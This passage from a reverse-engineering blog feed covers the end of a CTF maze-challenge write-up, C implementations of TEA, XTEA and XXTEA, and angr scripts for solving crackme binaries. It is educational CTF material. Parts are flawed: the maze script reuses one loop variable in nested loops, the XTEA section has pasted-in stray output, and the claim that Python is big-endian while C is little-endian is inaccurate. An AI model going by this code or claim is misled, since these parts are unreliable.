class="number">0x0000015F</span>, <span class="number">0x0000026C</span>, <span class="number">0x000003DF</span>, <span class="number">0x00000434</span>, <span class="number">0x00000569</span>, <span class="number">0x00000658</span>, <span class="number">0x00000768</span>, <span class="number">0x000008B4</span>, <span class="number">0x00000976</span>, <span class="number">0x00000A56</span>, <span class="number">0x00000B68</span>, <span class="number">0x00000CBF</span>, <span class="number">0x00000DCB</span>, <span class="number">0x00000E81</span>, <span class="number">0x00000FE7</span>, <span class="number">0x00001062</span>, <span class="number">0x00001196</span>, <span class="number">0x00001233</span>, <span class="number">0x000013FE</span>, <span class="number">0x00001486</span>, <span class="number">0x000000E7</span>, <span class="number">0x000001AF</span>, <span class="number">0x00000205</span>, <span class="number">0x00000371</span>, <span class="number">0x00000482</span>, <span class="number">0x000005F0</span>, <span class="number">0x00000670</span>, <span class="number">0x0000072E</span>, <span class="number">0x00000849</span>, <span class="number">0x00000925</span>, <span class="number">0x00000A5B</span>, <span class="number">0x00000B0E</span>, <span class="number">0x00000C7F</span>, <span class="number">0x00000D75</span>, <span class="number">0x00000EF4</span>, <span class="number">0x00000F61</span>, <span class="number">0x0000101D</span>, <span class="number">0x0000116B</span>, <span class="number">0x0000127E</span>, <span class="number">0x00001382</span>, <span class="number">0x00001404</span>, <span class="number">0x0000004D</span>, <span class="number">0x0000015C</span>, <span class="number">0x0000027F</span>, <span class="number">0x0000033F</span>, <span class="number">0x00000442</span>, <span class="number">0x000005B6</span>, <span class="number">0x0000064D</span>, <span class="number">0x00000780</span>, <span class="number">0x0000086B</span>, <span class="number">0x000009DC</span>, <span class="number">0x00000AF1</span>, <span class="number">0x00000B79</span>, <span class="number">0x00000C66</span>, <span class="number">0x00000D6E</span>, <span class="number">0x00000E9D</span>, <span class="number">0x00000F23</span>, <span class="number">0x0000107B</span>, <span class="number">0x00001126</span>, <span class="number">0x000012D5</span>, <span class="number">0x0000133F</span>, <span class="number">0x000014AE</span>, <span class="number">0x0000007D</span>, <span class="number">0x000001AD</span>, <span class="number">0x000002BB</span>, <span class="number">0x000003A1</span>, <span class="number">0x00000473</span>, <span class="number">0x0000054E</span>, <span class="number">0x000006C0</span>, <span class="number">0x000007D0</span>, <span class="number">0x0000083F</span>, <span class="number">0x000009DA</span>, <span class="number">0x00000AE6</span>, <span class="number">0x00000BA9</span>, <span class="number">0x00000CA0</span>, <span class="number">0x00000DC3</span>, <span class="number">0x00000E30</span>, <span class="number">0x00000F8E</span>, <span class="number">0x00001066</span>, <span class="number">0x000011CD</span>, <span class="number">0x0000124B</span>, <span class="number">0x00001361</span>, <span class="number">0x000014B8</span>, <span class="number">0x000000EE</span>, <span class="number">0x0000016D</span>, <span class="number">0x00000275</span>, <span class="number">0x0000033C</span>, <span class="number">0x00000473</span>, <span class="number">0x000005A8</span>, <span class="number">0x00000679</span>, <span class="number">0x00000759</span>, <span class="number">0x0000080B</span>, <span class="number">0x000009B4</span>, <span class="number">0x00000AC7</span>, <span class="number">0x00000B03</span>, <span class="number">0x00000C07</span>, <span class="number">0x00000DAE</span>, <span class="number">0x00000E82</span>, <span class="number">0x00000FF8</span>, <span class="number">0x00001050</span>, <span class="number">0x000011DF</span>, <span class="number">0x00001261</span>, <span class="number">0x000013A0</span>, <span class="number">0x000014D5</span>, <span class="number">0x00000053</span>, <span class="number">0x000001B7</span>, <span class="number">0x000002D8</span>, <span class="number">0x000003B8</span>, <span class="number">0x00000478</span>, <span class="number">0x000005BC</span>, <span class="number">0x000006CC</span>, <span class="number">0x000007DE</span>, <span class="number">0x000008C6</span>, <span class="number">0x00000990</span>, <span class="number">0x00000A3F</span>, <span class="number">0x00000B21</span>, <span class="number">0x00000CBF</span>, <span class="number">0x00000DBB</span>, <span class="number">0x00000EDC</span>, <span class="number">0x00000FB1</span>, <span class="number">0x0000103B</span>, <span class="number">0x0000116B</span>, <span class="number">0x0000126B</span>, <span class="number">0x000013E0</span>, <span class="number">0x00001434</span>]</span><br><span class="line"></span><br><span class="line">    tmp = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">441</span>):</span><br><span class="line">        tmp.append(dword_4043C8[i] ^ byte_404208[i])</span><br><span class="line"></span><br><span class="line">    maze = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">21</span>):</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">21</span>):</span><br><span class="line">            <span class="built_in">print</span>(tmp[i * <span class="number">21</span> + <span class="number">0</span> : i * <span class="number">21</span> + <span class="number">21</span>])</span><br><span class="line">            maze.append(tmp[i * <span class="number">21</span> + <span class="number">0</span> : i * <span class="number">21</span> + <span class="number">21</span>])</span><br><span class="line"></span><br><span class="line">    start=(<span class="number">0</span>,<span class="number">0</span>)</span><br><span class="line">    end=(<span class="number">20</span>,<span class="number">20</span>)</span><br><span class="line">    </span><br><span class="line">    find_path(maze,start,end)</span><br><span class="line">    see_path(maze,path)</span><br><span class="line"><span class="comment">#jjjllllllllllllllljjjjjjjjkjjkkkkhhhhhhhkkkkkkkkkkjjjjllljjjlllhhhhlljjjjjjkkkkkkkkjjlllllllllllhhlllllhhhlhhhhhhhhlljjjjjjjjjjjjjjjjl</span></span><br></pre></td></tr></table></figure><p>最终结果：</p><p><img src="/2022/08/26/2022-%E9%95%BF%E5%9F%8E%E6%9D%AF%E6%94%BF%E4%BC%81%E7%BB%84-wp/1661451301787.png" alt="1661451301787"></p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>这道题确实超出我能力范围，还需要接着努力。长城杯这道题做出来的人，高校组差不多有十个左右？政企组就只有两个，如果这个题做出来了，应该可以去线下了吧。不过这一年的努力没有白费，希望网鼎杯能出好成绩。关于try except中，SEH反调试优先交给调试器这个我有个印象，之前听大佬们讲直播讲课有提及。hed10ne大佬留了一篇反调试佳作：<a href="https://www.cnblogs.com/hed10ne/p/anti-debug-techs.html">反调试技术整理</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;2022-长城杯政企组-wp&quot;&gt;&lt;a href=&quot;#2022-长城杯政企组-wp&quot; class=&quot;headerlink&quot; title=&quot;2022 长城杯政企组 wp&quot;&gt;&lt;/a&gt;2022 长城杯政企组 wp&lt;/h1&gt;&lt;p&gt;这次比赛实际并列26名，前15名进入线下复赛</summary>
      
    
    
    
    <category term="reverse" scheme="https://feverhu.github.io/categories/reverse/"/>
    
    <category term="match" scheme="https://feverhu.github.io/categories/reverse/match/"/>
    
    
    <category term="异常处理" scheme="https://feverhu.github.io/tags/%E5%BC%82%E5%B8%B8%E5%A4%84%E7%90%86/"/>
    
  </entry>
  
  <entry>
    <title>TEA学习</title>
    <link href="https://feverhu.github.io/2022/08/07/TEA%E5%AD%A6%E4%B9%A0/"/>
    <id>https://feverhu.github.io/2022/08/07/TEA%E5%AD%A6%E4%B9%A0/</id>
    <published>2022-08-07T02:04:53.000Z</published>
    <updated>2022-08-07T07:14:26.882Z</updated>
    
    <content type="html"><![CDATA[<h2 id="TEA"><a href="#TEA" class="headerlink" title="TEA"></a><strong>TEA</strong></h2><p>感谢各位师傅，转载连接：<a href="https://www.cnblogs.com/sk2rw/p/14797633.html">https://www.cnblogs.com/sk2rw/p/14797633.html</a></p><p>我做做删减和补充。</p><h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>TEA算法使用64位的明文分组和128位的密钥，使用feistel分组加框架，需要进行32轮循环得到最后的64位密文，其中magic number DELTA是由黄金分割点。<br><img src="/2022/08/07/TEA%E5%AD%A6%E4%B9%A0/2022-02-19-08-34-58mk-.png"></p><p>tea算法最关键的是要找到<strong>DELTA值和128位的key</strong>。</p><p>在逆向程序的时候，可以利用ida的插件findcypto识别tea算法。<br><img src="/2022/08/07/TEA%E5%AD%A6%E4%B9%A0/2022-02-19-08-29-02mk-.png"></p><p>如上图的程序，可以看出a2就是key，v4-&#x3D;0x61c88647和v4+&#x3D;0x9e3779b9是等价的，显然DELTA就是0x9e3779b9</p><p>Tea算法还可以进行魔改，魔改的地方主要是DELTA值，将这个值修改会让很多加密算法识别软件失效，像下面的程序就将DELTA魔改为0x1234567，绕过来peid的插件KANAL的识别。</p><p><strong>补充TEA及魔改TEA加密与解密源码：</strong></p><h3 id="初级TEA"><a href="#初级TEA" class="headerlink" title="初级TEA"></a><strong>初级TEA</strong></h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdint.h&gt;</span><br><span class="line"> </span><br><span class="line">//加密函数</span><br><span class="line">void encrypt (uint32_t* v, uint32_t* k) &#123;</span><br><span class="line">    uint32_t v0=v[0], v1=v[1], sum=0, i;           /* set up */</span><br><span class="line">    uint32_t delta=0x9e3779b9;                     /* a key schedule constant */</span><br><span class="line">    uint32_t k0=k[0], k1=k[1], k2=k[2], k3=k[3];   /* cache key */</span><br><span class="line">    for (i=0; i &lt; 32; i++) &#123;                       /* basic cycle start */</span><br><span class="line">        sum += delta;</span><br><span class="line">        v0 += ((v1&lt;&lt;4) + k0) ^ (v1 + sum) ^ ((v1&gt;&gt;5) + k1);</span><br><span class="line">        v1 += ((v0&lt;&lt;4) + k2) ^ (v0 + sum) ^ ((v0&gt;&gt;5) + k3);</span><br><span class="line">    &#125;                                              /* end cycle */</span><br><span class="line">    v[0]=v0; v[1]=v1;</span><br><span class="line">&#125;</span><br><span class="line">//解密函数</span><br><span class="line">void decrypt (uint32_t* v, uint32_t* k) &#123;</span><br><span class="line">    uint32_t v0=v[0], v1=v[1], sum=0xC6EF3720, i;  /* set up */</span><br><span class="line">    uint32_t delta=0x9e3779b9;                     /* a key schedule constant */</span><br><span class="line">    uint32_t k0=k[0], k1=k[1], k2=k[2], k3=k[3];   /* cache key */</span><br><span class="line">    for (i=0; i&lt;32; i++) &#123;                         /* basic cycle start */</span><br><span class="line">        v1 -= ((v0&lt;&lt;4) + k2) ^ (v0 + sum) ^ ((v0&gt;&gt;5) + k3);</span><br><span class="line">        v0 -= ((v1&lt;&lt;4) + k0) ^ (v1 + sum) ^ ((v1&gt;&gt;5) + k1);</span><br><span class="line">        sum -= delta;</span><br><span class="line">    &#125;                                              /* end cycle */</span><br><span class="line">    v[0]=v0; v[1]=v1;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">    uint32_t v[2]=&#123;1,2&#125;,k[4]=&#123;2,2,3,4&#125;;</span><br><span class="line">    // v为要加密的数据是两个32位无符号整数</span><br><span class="line">    // k为加密解密密钥，为4个32位无符号整数，即密钥长度为128位</span><br><span class="line">    printf(&quot;加密前原始数据：%u %u\n&quot;,v[0],v[1]);</span><br><span class="line">    encrypt(v, k);</span><br><span class="line">    printf(&quot;加密后的数据：%u %u\n&quot;,v[0],v[1]);</span><br><span class="line">    decrypt(v, k);</span><br><span class="line">    printf(&quot;解密后的数据：%u %u\n&quot;,v[0],v[1]);</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="TEA升级版XTEA"><a href="#TEA升级版XTEA" class="headerlink" title="TEA升级版XTEA"></a><strong>TEA升级版XTEA</strong></h3><p>增加了更多的密钥表，移位和异或等操作。</p><p>XTEA是TEA的扩展，也称做TEAN，它使用与TEA相同的简单运算，同样是一个64位块的Feistel密码，使用128位密钥，建议64轮, 但四个子密钥采取不正规的方式进行混合以阻止密钥表攻击。</p><p><img src="/2022/08/07/TEA%E5%AD%A6%E4%B9%A0/2022-02-19-08-36-17mk-.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line">加密前原始数据：1 2  </span><br><span class="line">加密后的数据：1347371722 925494771  </span><br><span class="line">解密后的数据：1 2  </span><br><span class="line">  </span><br><span class="line">Process returned 0 (0x0)   execution time : 0.020 s  </span><br><span class="line">Press any key to continue.  </span><br><span class="line"></span><br><span class="line">XTEA是TEA的升级版，增加了更多的密钥表，移位和异或操作等等，设计者是Roger Needham, David Wheeler</span><br><span class="line">加密过程：</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">算法实现：</span><br><span class="line"></span><br><span class="line">示例代码：</span><br><span class="line"></span><br><span class="line">[cpp] view plain copy</span><br><span class="line">#include &lt;stdio.h&gt;  </span><br><span class="line">#include &lt;stdint.h&gt;  </span><br><span class="line">  </span><br><span class="line">/* take 64 bits of data in v[0] and v[1] and 128 bits of key[0] - key[3] */  </span><br><span class="line">  </span><br><span class="line">void encipher(unsigned int num_rounds, uint32_t v[2], uint32_t const key[4]) &#123;  </span><br><span class="line">    unsigned int i;  </span><br><span class="line">    uint32_t v0=v[0], v1=v[1], sum=0, delta=0x9E3779B9;  </span><br><span class="line">    for (i=0; i &lt; num_rounds; i++) &#123;  </span><br><span class="line">        v0 += (((v1 &lt;&lt; 4) ^ (v1 &gt;&gt; 5)) + v1) ^ (sum + key[sum &amp; 3]);  </span><br><span class="line">        sum += delta;  </span><br><span class="line">        v1 += (((v0 &lt;&lt; 4) ^ (v0 &gt;&gt; 5)) + v0) ^ (sum + key[(sum&gt;&gt;11) &amp; 3]);  </span><br><span class="line">    &#125;  </span><br><span class="line">    v[0]=v0; v[1]=v1;  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line">void decipher(unsigned int num_rounds, uint32_t v[2], uint32_t const key[4]) &#123;  </span><br><span class="line">    unsigned int i;  </span><br><span class="line">    uint32_t v0=v[0], v1=v[1], delta=0x9E3779B9, sum=delta*num_rounds;  </span><br><span class="line">    for (i=0; i &lt; num_rounds; i++) &#123;  </span><br><span class="line">        v1 -= (((v0 &lt;&lt; 4) ^ (v0 &gt;&gt; 5)) + v0) ^ (sum + key[(sum&gt;&gt;11) &amp; 3]);  </span><br><span class="line">        sum -= delta;  </span><br><span class="line">        v0 -= (((v1 &lt;&lt; 4) ^ (v1 &gt;&gt; 5)) + v1) ^ (sum + key[sum &amp; 3]);  </span><br><span class="line">    &#125;  </span><br><span class="line">    v[0]=v0; v[1]=v1;  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line">int main()  </span><br><span class="line">&#123;  </span><br><span class="line">    uint32_t v[2]=&#123;1,2&#125;;  </span><br><span class="line">    uint32_t const k[4]=&#123;2,2,3,4&#125;;  </span><br><span class="line">    unsigned int r=32;//num_rounds建议取值为32  </span><br><span class="line">    // v为要加密的数据是两个32位无符号整数  </span><br><span class="line">    // k为加密解密密钥，为4个32位无符号整数，即密钥长度为128位  </span><br><span class="line">    printf(&quot;加密前原始数据：%u %u\n&quot;,v[0],v[1]);  </span><br><span class="line">    encipher(r, v, k);  </span><br><span class="line">    printf(&quot;加密后的数据：%u %u\n&quot;,v[0],v[1]);  </span><br><span class="line">    decipher(r, v, k);  </span><br><span class="line">    printf(&quot;解密后的数据：%u %u\n&quot;,v[0],v[1]);  </span><br><span class="line">    return 0;  </span><br><span class="line">&#125;  </span><br></pre></td></tr></table></figure><h3 id="XXTEA"><a href="#XXTEA" class="headerlink" title="XXTEA"></a><strong>XXTEA</strong></h3><p><strong>又称Corrected Block TEA，是XTEA的升级版</strong><br>XXTEA是一个非平衡Feistel网络分组密码，在可变长度块上运行，这些块是32位大小的任意倍数（最小64位），使用128位密钥, 是目前TEA系列中最安全的算法，但性能较上两种有所降低。<br><img src="/2022/08/07/TEA%E5%AD%A6%E4%B9%A0/2022-02-19-08-59-53mk-.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;  </span><br><span class="line">#include &lt;stdint.h&gt;  </span><br><span class="line">#define DELTA 0x9e3779b9  </span><br><span class="line">#define MX (((z&gt;&gt;5^y&lt;&lt;2) + (y&gt;&gt;3^z&lt;&lt;4)) ^ ((sum^y) + (key[(p&amp;3)^e] ^ z)))  </span><br><span class="line">  </span><br><span class="line">void btea(uint32_t *v, int n, uint32_t const key[4])  </span><br><span class="line">&#123;  </span><br><span class="line">    uint32_t y, z, sum;  </span><br><span class="line">    unsigned p, rounds, e;  </span><br><span class="line">    if (n &gt; 1)            /* Coding Part */  </span><br><span class="line">    &#123;  </span><br><span class="line">        rounds = 6 + 52/n;  </span><br><span class="line">        sum = 0;  </span><br><span class="line">        z = v[n-1];  </span><br><span class="line">        do  </span><br><span class="line">        &#123;  </span><br><span class="line">            sum += DELTA;  </span><br><span class="line">            e = (sum &gt;&gt; 2) &amp; 3;  </span><br><span class="line">            for (p=0; p&lt;n-1; p++)  </span><br><span class="line">            &#123;  </span><br><span class="line">                y = v[p+1];  </span><br><span class="line">                z = v[p] += MX;  </span><br><span class="line">            &#125;  </span><br><span class="line">            y = v[0];  </span><br><span class="line">            z = v[n-1] += MX;  </span><br><span class="line">        &#125;  </span><br><span class="line">        while (--rounds);  </span><br><span class="line">    &#125;  </span><br><span class="line">    else if (n &lt; -1)      /* Decoding Part */  </span><br><span class="line">    &#123;  </span><br><span class="line">        n = -n;  </span><br><span class="line">        rounds = 6 + 52/n;  </span><br><span class="line">        sum = rounds*DELTA;  </span><br><span class="line">        y = v[0];  </span><br><span class="line">        do  </span><br><span class="line">        &#123;  </span><br><span class="line">            e = (sum &gt;&gt; 2) &amp; 3;  </span><br><span class="line">            for (p=n-1; p&gt;0; p--)  </span><br><span class="line">            &#123;  </span><br><span class="line">                z = v[p-1];  </span><br><span class="line">                y = v[p] -= MX;  </span><br><span class="line">            &#125;  </span><br><span class="line">            z = v[n-1];  </span><br><span class="line">            y = v[0] -= MX;  </span><br><span class="line">            sum -= DELTA;  </span><br><span class="line">        &#125;  </span><br><span class="line">        while (--rounds);  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">int main()  </span><br><span class="line">&#123;  </span><br><span class="line">    uint32_t v[2]= &#123;1,2&#125;;  </span><br><span class="line">    uint32_t const k[4]= &#123;2,2,3,4&#125;;  </span><br><span class="line">    int n= 2; //n的绝对值表示v的长度，取正表示加密，取负表示解密  </span><br><span class="line">    // v为要加密的数据是两个32位无符号整数  </span><br><span class="line">    // k为加密解密密钥，为4个32位无符号整数，即密钥长度为128位  </span><br><span class="line">    printf(&quot;加密前原始数据：%u %u\n&quot;,v[0],v[1]);  </span><br><span class="line">    btea(v, n, k);  </span><br><span class="line">    printf(&quot;加密后的数据：%u %u\n&quot;,v[0],v[1]);  </span><br><span class="line">    btea(v, -n, k);  </span><br><span class="line">    printf(&quot;解密后的数据：%u %u\n&quot;,v[0],v[1]);  </span><br><span class="line">    return 0;  </span><br><span class="line">&#125;  </span><br></pre></td></tr></table></figure><h4 id="注意！"><a href="#注意！" class="headerlink" title="注意！"></a>注意！</h4><p>python是大端序， 我们的C语言是小端序。所以需要转化一下。例如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">python:</span><br><span class="line">b&#x27;\xbc\xa5\xce@\xf4\xb2\xb2\xe7\xa9\x12\x9d\x12\xae\x10\xc8[=\xd7\x06\x1d\xdcp\xf8\xdc&#x27;</span><br><span class="line">c++:</span><br><span class="line">uint32_t v[6]= &#123;0x40cea5bc,0xe7b2b2f4,0x129d12a9,0x5bc810ae,0x1d06d73d,0xdcf870dc&#125;; </span><br><span class="line">&quot;flag&quot; 0x67616c66 </span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;TEA&quot;&gt;&lt;a href=&quot;#TEA&quot; class=&quot;headerlink&quot; title=&quot;TEA&quot;&gt;&lt;/a&gt;&lt;strong&gt;TEA&lt;/strong&gt;&lt;/h2&gt;&lt;p&gt;感谢各位师傅，转载连接：&lt;a href=&quot;https://www.cnblogs.com/sk2r</summary>
      
    
    
    
    <category term="reverse" scheme="https://feverhu.github.io/categories/reverse/"/>
    
    
    <category term="TEA" scheme="https://feverhu.github.io/tags/TEA/"/>
    
  </entry>
  
  <entry>
    <title>angr学习</title>
    <link href="https://feverhu.github.io/2022/08/07/angr%E5%AD%A6%E4%B9%A0/"/>
    <id>https://feverhu.github.io/2022/08/07/angr%E5%AD%A6%E4%B9%A0/</id>
    <published>2022-08-07T01:16:54.000Z</published>
    <updated>2022-08-07T07:14:10.445Z</updated>
    
    <content type="html"><![CDATA[<h1 id="angr学习"><a href="#angr学习" class="headerlink" title="angr学习"></a><strong>angr学习</strong></h1><h2 id="angr基本脚本"><a href="#angr基本脚本" class="headerlink" title="angr基本脚本"></a><strong>angr基本脚本</strong></h2><h3 id="一、非命令行输入"><a href="#一、非命令行输入" class="headerlink" title="一、非命令行输入"></a>一、非命令行输入</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">import angr</span><br><span class="line">import sys</span><br><span class="line"></span><br><span class="line">def Go():</span><br><span class="line">    path_to_binary = &quot;*****&quot;</span><br><span class="line">    project = angr.Project(path_to_binary, auto_load_libs=False)</span><br><span class="line">    initial_state = project.factory.entry_state()</span><br><span class="line">    simulation = project.factory.simgr(initial_state)</span><br><span class="line">    #一般我会先查看程序起始地址，64位程序可能是0x400000，32位可能是0x800000</span><br><span class="line">    #print(project.entry)</span><br><span class="line">    print_good_address = 0x4009E7 </span><br><span class="line">    simulation.explore(find=print_good_address)</span><br><span class="line"></span><br><span class="line">    if simulation.found:</span><br><span class="line">        solution_state = simulation.found[0]</span><br><span class="line">        solution = solution_state.posix.dumps(sys.stdin.fileno()) # 大概意思是dump出输入</span><br><span class="line">        print(solution)</span><br><span class="line">    else:</span><br><span class="line">        raise Exception(&#x27;Could not find the solution&#x27;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    Go()</span><br><span class="line">    #path_to_binary = &quot;oruga&quot;</span><br><span class="line">    #project = angr.Project(path_to_binary, auto_load_libs=False)</span><br><span class="line">    #print(project.entry)</span><br></pre></td></tr></table></figure><h3 id="二、使用命令行参数情况"><a href="#二、使用命令行参数情况" class="headerlink" title="二、使用命令行参数情况"></a>二、使用命令行参数情况</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">import angr</span><br><span class="line">import sys</span><br><span class="line">import claripy</span><br><span class="line"></span><br><span class="line">def Go():</span><br><span class="line">    path_to_binary = &quot;chall&quot;</span><br><span class="line">    project = angr.Project(path_to_binary, auto_load_libs=False)</span><br><span class="line">    #print(project.entry)</span><br><span class="line">    argv1 = claripy.BVS(&#x27;argv1&#x27;,33*8)</span><br><span class="line">    initial_state = project.factory.entry_state(args=[&quot;./chall&quot;, argv1])</span><br><span class="line">    simulation = project.factory.simgr(initial_state)</span><br><span class="line"></span><br><span class="line">    print_good_address = 0x400817</span><br><span class="line">    simulation.explore(find=print_good_address)</span><br><span class="line"></span><br><span class="line">    if simulation.found:</span><br><span class="line">        solution_state = simulation.found[0].solver.eval(argv1)   # 打印结果</span><br><span class="line">        solution = solution_state.to_bytes(33,&quot;big&quot;)</span><br><span class="line">        print(solution)</span><br><span class="line">    else:</span><br><span class="line">        raise Exception(&#x27;Could not find the solution&#x27;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    Go()</span><br></pre></td></tr></table></figure><h3 id="代替scanf："><a href="#代替scanf：" class="headerlink" title="代替scanf："></a>代替scanf：</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">import angr</span><br><span class="line">import sys</span><br><span class="line">import claripy</span><br><span class="line">def main(argv):</span><br><span class="line"></span><br><span class="line">  path_to_binary =  &#x27;ROR.exe&#x27; # :string</span><br><span class="line">  project = angr.Project(path_to_binary)</span><br><span class="line">  initial_state = project.factory.entry_state()</span><br><span class="line"></span><br><span class="line">  class ReplacementScanf(angr.SimProcedure):</span><br><span class="line">    def run(self, format_string, param0):</span><br><span class="line">      scanf0 = 